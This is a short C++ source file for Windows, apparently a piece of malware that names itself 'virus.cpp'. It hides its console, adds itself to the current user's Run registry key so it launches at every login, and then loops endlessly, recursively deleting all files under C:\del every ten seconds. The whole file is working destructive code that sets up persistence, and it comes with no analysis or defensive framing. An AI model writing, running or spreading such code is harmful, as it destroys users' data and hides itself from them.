#include <iostream>
#include <filesystem>
#include <Windows.h>
#include <cstring>
#include <string>
#include <locale>
#include <chrono>
#include <thread>

namespace fs = std::filesystem;

void delete_files() {
    fs::current_path("C:\\del");
    for (auto& entry : fs::recursive_directory_iterator(".")) {
        if (entry.is_regular_file()) {
            fs::remove(entry.path());
        }
    }
}

bool AddToAutorun(wchar_t* programPath, const wchar_t* autorunName)
{
    HKEY hKey;
    long result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);

    if (result == ERROR_SUCCESS)
    {
        result = RegSetValueExW(hKey, autorunName, 0, REG_SZ, (BYTE*)programPath, (wcslen(programPath) + 1) * sizeof(wchar_t));

        RegCloseKey(hKey);

        if (result == ERROR_SUCCESS)
        {
            return true;
        }
    }

    return false;
}


int main(int argc, char* argv[]) {
    FreeConsole();

    wchar_t wcharString[200]; // wide-char string
    wchar_t wcharString2[100];
    char autorunName[] = "virus.cpp";
    size_t converted; // number of characters converted

    std::setlocale(LC_ALL, "");

    mbstowcs_s(&converted, wcharString, sizeof(wcharString) / sizeof(wchar_t), argv[0], strlen(argv[0])); // convert the char string to a wide-char string
    mbstowcs_s(&converted, wcharString2, sizeof(wcharString2) / sizeof(wchar_t), autorunName, strlen(autorunName));

    AddToAutorun(wcharString, wcharString2);

    while (true) {

        delete_files();

        std::this_thread::sleep_for(std::chrono::seconds(10));
    }

    return 0;
}
